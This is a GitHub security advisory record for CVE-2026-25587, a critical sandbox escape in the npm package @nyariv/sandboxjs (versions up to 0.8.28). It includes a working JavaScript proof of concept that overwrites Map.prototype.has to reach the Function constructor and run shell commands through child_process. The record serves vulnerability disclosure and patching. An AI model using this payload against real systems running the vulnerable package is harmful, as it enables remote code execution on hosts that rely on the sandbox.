advisory_id: GHSA-66h4-qj4x-38xp
datasource_id: github_osv_importer_v2/GHSA-66h4-qj4x-38xp
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-66h4-qj4x-38xp/GHSA-66h4-qj4x-38xp.json
aliases:
  - CVE-2026-25587
summary: "@nyariv/sandboxjs has a Sandbox Escape vulnerability\n### Summary\n\nAs `Map` is in\
  \ `SAFE_PROTOYPES`, it's prototype can be obtained via `Map.prototype`. By overwriting `Map.prototype.has`\
  \ the sandbox can be escaped.\n\n### Details\n\nThis is effectively equivalent to CVE-2026-25142,\
  \ but without `__lookupGetter__`  (`let` was used during testing), it turns out the `let`\
  \ implementation is bugged:\n\n```js\nlet a = Map.prototype;\nconsole.log(a) // undefined\n\
  ```\n\n```js\nconst a = Map.prototype;\nconsole.log(a) // Object [Map] {}\n```\n\n```js\n\
  let a = 123;\nconsole.log(a) // 123\n```\n\n```js\nconst a = 123;\nconsole.log(a) // 123\n\
  ``` \n\n### PoC\n\n```js\nconst s = require(\"@nyariv/sandboxjs\").default;\nconst sb = new\
  \ s();\n\npayload = `\nconst m = Map.prototype;\nm.has = isFinite;\n\nconsole.log(\n  isFinite.constructor(\n\
  \    \"return process.getBuiltinModule('child_process').execSync('ls -lah').toString()\",\n\
  \  )(),\n);`;\n\nsb.compile(payload)().run();\n```\n\n### Impact\n\nAble to set `Map.prototype.has`\
  \ -> RCE"
impacted_packages:
  - purl: pkg:npm/%40nyariv/sandboxjs
    affected_versions: vers:npm/<=0.8.28
    fixed_versions: vers:npm/0.8.29
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '10.0'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-66h4-qj4x-38xp/GHSA-66h4-qj4x-38xp.json
  - score: CRITICAL
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-94
  - CWE-74
references:
  - url: https://github.com/nyariv/SandboxJS
    reference_type:
    reference_id:
  - url: https://github.com/nyariv/SandboxJS/commit/67cb186c41c78c51464f70405504e8ef0a6e43c3
    reference_type:
    reference_id:
  - url: https://github.com/nyariv/SandboxJS/security/advisories/GHSA-66h4-qj4x-38xp
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-25587
    reference_type:
    reference_id:
